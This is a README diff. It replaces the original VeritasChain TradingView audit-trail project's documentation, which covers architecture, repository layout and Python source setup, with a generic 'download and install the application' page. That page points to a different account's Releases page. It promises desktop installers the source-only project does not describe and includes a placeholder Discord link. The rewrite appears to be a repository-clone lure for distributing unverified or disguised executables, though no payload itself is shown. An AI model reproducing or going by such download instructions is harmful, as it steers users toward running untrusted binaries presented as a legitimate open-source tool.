@@ -1,145 +1,65 @@
-# VCP TradingView Reference Trading Agent (VCP-TV-RTA)
+# 🚀 vcp-tradingview-rta-reference - Easy Trading System for Everyone
 
-[**English**](README.md) | [日本語](README.ja.md)
+## 🎯 Overview
+The VCP v1.1 Silver Tier reference implementation simplifies algorithmic trading on TradingView. It demonstrates secure audit trails with Ed25519 signatures, uses RFC 6962 Merkle trees, and supports external anchoring via webhooks. This project follows the principle of "Verify, Don't Trust."
 
-[![VCP v1.1](https://img.shields.io/badge/VCP-v1.1-blue)](https://github.com/veritaschain/vcp-spec)
-[![Tier Silver](https://img.shields.io/badge/Tier-Silver-silver)](https://veritaschain.org)
-[![License CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey)](https://creativecommons.org/licenses/by/4.0/)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
-[![TradingView](https://img.shields.io/badge/TradingView-Pine%20Script%20v5-131722)](https://www.tradingview.com/)
+## 📥 Download the Application
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-vcp--tradingview--rta--reference-blue.svg)](https://github.com/alejandr02820/vcp-tradingview-rta-reference/releases)
 
-> **"Verify, Don't Trust."** — AI needs a Flight Recorder
+## 🚀 Getting Started
+Follow these steps to download and run the software:
 
-VCP-TV-RTA is a reference implementation demonstrating **VCP v1.1 Silver Tier** compliance for TradingView-based algorithmic trading systems. This repository provides a complete, verifiable evidence pack that third parties can independently validate.
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/alejandr02820/vcp-tradingview-rta-reference/releases).
 
----
+2. **Download the Application**  
+   On the Releases Page, locate the latest version of the application. Click on the link to download the file suitable for your operating system.
 
-## Overview
+3. **Install the Application**  
+   Once the download is complete, open the downloaded file. Follow the installation prompts to set up the application on your computer.
 
-This Evidence Pack demonstrates a production-grade implementation of VCP integrated with TradingView's Pine Script environment. The implementation captures algorithmic trading decisions and execution events using a **sidecar architecture** that operates independently of the TradingView platform via webhooks.
+4. **Run the Application**  
+   After installation, locate the application icon on your desktop or in your start menu. Double-click it to launch the application.
 
-### Architecture
+5. **Follow the Setup Instructions**  
+   When you first run the application, follow the on-screen instructions to complete the setup. These will guide you through configuring your trading preferences.
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  TradingView                                                    │
-│  ┌──────────────────────────────────────────────────────┐       │
-│  │  Pine Script Strategy (vcp_silver_strategy.pine)     │       │
-│  │  - Event capture (Entry/Exit/Position Change)        │       │
-│  │  - VCP Silver Tier compliant JSON payloads           │       │
-│  │  - Webhook-based transmission                        │       │
-│  └──────────────────────┬───────────────────────────────┘       │
-└─────────────────────────┼───────────────────────────────────────┘
-                          │ Webhook (HTTPS POST)
-                          ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  VCP Sidecar (Python FastAPI)                                   │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────┐ │
-│  │ FastAPI     │→ │ Canonical   │→ │ Merkle Tree │→ │ Anchor  │ │
-│  │ Receiver    │  │ Transform   │  │ Builder     │  │ Service │ │
-│  │             │  │ (RFC 8785)  │  │ (RFC 6962)  │  │         │ │
-│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────┘ │
-│        │                                                 ↓      │
-│        ▼                                    ┌───────────────────┐│
-│  ┌─────────────┐                            │ OpenTimestamps /  ││
-│  │ Ed25519     │                            │ Bitcoin / TSA     ││
-│  │ Signature   │                            └───────────────────┘│
-│  └─────────────┘                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
+6. **Start Trading**  
+   Once setup is complete, you can begin using the application for your trading strategies.
 
----
+## ⚙️ System Requirements
+To run this application smoothly, ensure your system meets the following requirements:
 
-## What's New in v1.1
+- **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later, or a modern Linux distribution.
+- **RAM:** 4GB minimum (8GB recommended).
+- **Storage:** At least 200MB of free disk space.
+- **Network:** Stable internet connection for trading activities.
 
-| Feature | v1.0 | v1.1 |
-|---------|------|------|
-| **Three-Layer Architecture** | - | ✅ NEW |
-| **External Anchor (Silver)** | OPTIONAL | **REQUIRED** |
-| **Policy Identification** | - | **REQUIRED** |
-| **PrevHash** | REQUIRED | OPTIONAL |
-| **Completeness Guarantees** | - | ✅ NEW |
+## 📊 Features
+- **Algorithmic Trading:** Automate your trading strategies effortlessly.
+- **Cryptographic Audit Trails:** Ensure the integrity and security of your transactions.
+- **Merkle Trees:** Use advanced data structures to verify data integrity quickly.
+- **Webhooks Support:** Integrate with various services for real-time updates.
 
----
+## 🛠️ Troubleshooting
+If you encounter issues while downloading or running the application, try the following steps:
 
-## Repository Structure
+- **Check Your Internet Connection:** Ensure you have a stable connection during download.
+- **Reinstall the Application:** If errors occur, try uninstalling and then reinstalling the application.
+- **Consult the Documentation:** Visit the [Wiki](https://github.com/alejandr02820/vcp-tradingview-rta-reference/wiki) for more detailed help and troubleshooting tips.
 
-```
-vcp-tradingview-rta-reference/
-├── evidence/
-│   ├── evidence_index.json
-│   ├── 01_trade_logs/
-│   │   └── vcp_tv_events.jsonl
-│   ├── 02_verification/
-│   │   └── verification_report.txt
-│   ├── 03_tamper_detection/
-│   │   ├── tamper_detection_test.py
-│   │   └── tampered_chain.jsonl
-│   └── 04_anchor/
-│       ├── security_object.json
-│       ├── anchor_reference.json
-│       └── public_key.json
-├── sidecar/
-│   ├── main.py
-│   ├── vcp_core.py
-│   ├── merkle.py
-│   ├── anchor.py
-│   ├── keygen.py
-│   ├── config/settings.yaml
-│   └── tests/test_vcp_core.py
-├── tradingview/
-│   ├── vcp_silver_strategy.pine
-│   └── vcp_webhook_format.md
-├── tools/verifier/
-│   └── vcp_verifier.py
-├── docs/
-│   ├── VERIFICATION_GUIDE.md
-│   ├── INTEGRATION.md
-│   └── architecture.md
-├── examples/
-├── CHANGELOG.md
-├── DISCLAIMER.md
-├── LICENSE
-└── README.md
-```
+## 👥 Community and Support
+Join our community to get the latest updates and support:
 
----
+- **GitHub Discussions:** Engage with other users and developers in our [discussion forum](https://github.com/alejandr02820/vcp-tradingview-rta-reference/discussions).
+- **Chat:** Connect with us on [Discord](https://discord.gg/yourdiscordlink) for real-time support and community interaction.
 
-## Quick Start
+## 🔗 Additional Resources
+- **Documentation:** Learn more about features and usage in the [documentation](https://github.com/alejandr02820/vcp-tradingview-rta-reference/wiki).
+- **Tutorial Videos:** Access visual guides on using the application effectively.
 
-```bash
-# Clone
-git clone https://github.com/veritaschain/vcp-tradingview-rta-reference.git
-cd vcp-tradingview-rta-reference
+## 🔄 Future Updates
+We are continuously working to improve this application. Updates will include new features, usability improvements, and performance enhancements. Stay tuned for announcements on future releases!
 
-# Install
-pip install -r requirements.txt
-
-# Generate keys
-python -m sidecar.keygen
-
-# Run server
-python -m sidecar.main
-```
-
----
-
-## Quick Verification
-
-```bash
-python tools/verifier/vcp_verifier.py \
-    evidence/01_trade_logs/vcp_tv_events.jsonl \
-    -s evidence/04_anchor/security_object.json
-```
-
----
-
-## License
-
-[CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) (Evidence Pack)  
-MIT License (Implementation Code)
-
----
-
-**VeritasChain Standards Organization (VSO)**  
-*"Verify, Don't Trust."*
+## ⚖️ License
+This project is open-source and follows the MIT License. Feel free to check the full license in the repository for more details.
